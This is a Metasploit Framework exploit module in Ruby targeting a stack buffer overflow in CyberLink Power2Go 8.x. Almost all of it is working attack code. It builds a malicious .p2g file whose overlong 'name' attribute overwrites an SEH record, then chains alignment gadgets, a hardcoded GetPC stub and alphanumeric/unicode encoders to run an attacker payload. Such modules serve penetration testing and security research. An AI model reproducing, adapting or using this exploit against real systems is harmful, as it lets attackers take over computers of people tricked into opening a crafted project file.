# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => &#039;CyberLink Power2Go name attribute (p2g) Stack Buffer Overflow Exploit&#039;,
            &#039;Description&#039;     => %q{
                    This module exploits a stack buffer overflow in CyberLink Power2Go version 8.x
                The vulnerability is triggered when opening a malformed p2g file containing an overly
                long string in the &#039;name&#039; attribute of the file element. This results in overwriting a
                structured exception handler record.
            },
            &#039;License&#039;         => MSF_LICENSE,
            &#039;Author&#039;          =>
                [
                    &#039;modpr0be <modpr0be[at]spentera.com>&#039;,    # initial discovery
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039; # msf module
                ],
            &#039;References&#039;      =>
                [
                    [&#039;BID&#039;, &#039;50997&#039;],
                    [&#039;OSVDB&#039;, &#039;70600&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18220/&#039;],
                    [&#039;URL&#039;, &#039;http://www.kb.cert.org/vuls/id/158003&#039;]
                ],
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;         =>
                {
                    &#039;Space&#039;    => 1024,
                    &#039;BadChars&#039; => "\x00"
                },
            &#039;Platform&#039;        => &#039;win&#039;,
            &#039;Targets&#039;         =>
                [
                    # Power2Go8.exe (0x004b0028) - pop esi/pop ebp/pop ebx/add esp,10/retn
                    [ &#039;CyberLink Power2Go 8 (XP/Vista/win7) Universal&#039;, { &#039;Ret&#039; => "\x28\x4b" } ]
                ],
            &#039;DisclosureDate&#039;  => &#039;Sep 12 2011&#039;,
            &#039;DefaultTarget&#039;   => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The output filename.&#039;, &#039;msf.p2g&#039;])
            ], self.class)
    end
 
    def get_payload(hunter)
         
        [ &#039;x86/alpha_mixed&#039;, &#039;x86/unicode_mixed&#039; ].each { |name|
            enc = framework.encoders.create(name)
            if name =~ /unicode/
                enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;EAX&#039; })
            else
                enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;EDX&#039; })
            end
            # NOTE: we already eliminated badchars
            hunter = enc.encode(hunter, nil, nil, platform)
            if name =~/alpha/
                #insert getpc_stub & align EDX, unicode encoder friendly.
                #Hardcoded stub is not an issue here because it gets encoded anyway
                getpc_stub = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
                hunter = getpc_stub + hunter
            end
        }
 
        return hunter
    end
 
    def exploit
 
        title = rand_text_alpha(10)
        buffer =  ""
        buffer << rand_text_alpha(778)
        buffer << "\x58\x28"        # nseh
        buffer << target[&#039;Ret&#039;]     # seh
        buffer << "\x5f\x73" * 15   # pop edi/add [ebx],dh (after byte alignment)
        buffer << "\x58\x73"        # pop eax/add [ebx],dh (after byte alignment)
        buffer << "\x40\x73" * 3    # inc eax/add [ebx],dh (after byte alignment)
        buffer << "\x40"            # inc eax
        buffer << "\x73\x42" * 337  # add [ebx],dh/pop edx (after byte alignment)
        buffer << "\x73"            # add [ebx],dh (after byte alignment)
        buffer << get_payload(payload.encoded)
 
        p2g_data = <<-EOS
        <Project magic="#{title}" version="101">
        <Information />
            <Compilation>
                <DataDisc>
                    <File name="#{buffer}" />
                </DataDisc>
            </Compilation>
        </Project>
        EOS
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(p2g_data)
    end
end



